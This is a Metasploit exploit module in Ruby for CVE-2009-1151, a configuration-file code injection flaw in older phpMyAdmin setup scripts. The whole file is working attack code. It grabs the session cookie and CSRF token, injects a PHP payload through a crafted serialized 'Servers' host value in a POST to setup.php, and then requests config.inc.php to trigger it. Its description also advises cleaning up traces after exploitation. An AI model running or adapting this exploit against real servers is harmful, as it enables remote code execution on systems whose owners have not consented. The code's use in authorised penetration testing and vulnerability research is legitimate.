##
# $Id: php_eval.rb 7025 2009-09-10 05:24:03Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PhpMyAdmin config file code injection',
			'Description'    => %q{
					This module exploits a vulnerability in PhpMyAdmin's setup
					feature which allows an attacker to inject arbitrary PHP
					code into a configuration file. The original advisory says
					the vulnerability is present in phpMyAdmin versions 2.11.x
					< 2.11.9.5 and 3.x < 3.1.3.1; this module was tested on
					3.0.1.1.

					The file where our payload is written
					(phpMyAdmin/config/config.inc.php) is not directly used by
					the system, so it may be a good idea to either delete it or
					copy the running config (phpMyAdmin/config.inc.php) over it
					after successful exploitation.
				},
			'Author'         => [ 
					'Greg Ose', # Discovery
					'pagvac',   # milw0rm PoC
					'egypt'     # metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 7025 $',
			'References'     => [
					[ 'CVE', '2009-1151' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/8921' ],
					[ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php' ],
					[ 'URL', 'http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/' ]
				 ],
			'Privileged'     => false,
			'Platform'       => ['php'],
            'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					'Space'       => 4000, # unlimited really since our shellcode gets written to a file
					'DisableNops' => true,
					# No filtering whatsoever, so no badchars
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'Targets'        => [ ['Automatic (phpMyAdmin 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1)', { }], ],
			'DefaultTarget'  => 0
			))

		register_options(
			[
				OptString.new('URI',   [ true,  "Base phpMyAdmin directory path", '/phpMyAdmin/']),
			], self.class)

	end

	def exploit
		# First, grab the session cookie and the CSRF token
		print_status("Grabbing session cookie and CSRF token")
		uri = datastore['URI'] + "scripts/setup.php"
		response = send_request_raw({ 'uri' => uri})
		if !response
			raise RuntimeError.new("Server did not respond to our initial request")
			return
		end
		if (response.body !~ /"token"\s*value="([^"]*)"/)
			raise RuntimeError.new("Couldn't find token and can't continue without it. Is URI set correctly?")
			return
		end
		token = $1
		cookie = response["Set-Cookie"]
		
		# There is probably a great deal of randomization that can be done with
		# this format.
		config = "a:1:{s:7:\"Servers\";a:1:{i:0;a:6:{s:#{payload.encoded.length + 13}:\""
		config << "host']='';" + payload.encoded + ";//"
		config << '";s:9:"' + rand_text_alpha(9) + '";s:9:"extension";s:6:"mysqli";s:12:"connect_type"'
		config << ';s:3:"tcp";s:8:"compress";b:0;s:9:"auth_type";s:6:"config";s:4:"user";s:4:"' + rand_text_alpha(4) + '";}}}'

		data = "token=#{token}&action=save&configuration="
		data << Rex::Text.uri_encode(config)
		data << "&eoltype=unix"

		# Now that we've got the cookie and token, send the evil
		print_status("Sending save request")
		response = send_request_raw({
			'uri'	  => datastore['URI'] + "/scripts/setup.php",
			'method'  => 'POST',
			'data'    => data,
			'cookie'  => cookie,
			'headers' =>
			{
				'Content-Type'	 => 'application/x-www-form-urlencoded',
				'Content-Length' => data.length
			}
		}, 3)

		print_status("Requesting our payload")

		# very short timeout because the request may never return if we're
		# sending a socket payload
		timeout = 0.1
		response = send_request_raw({
			# Allow findsock payloads to work
			'global' => true,
			'uri' => datastore['URI'] + "/config/config.inc.php"
		}, timeout)

		handler
	end
end


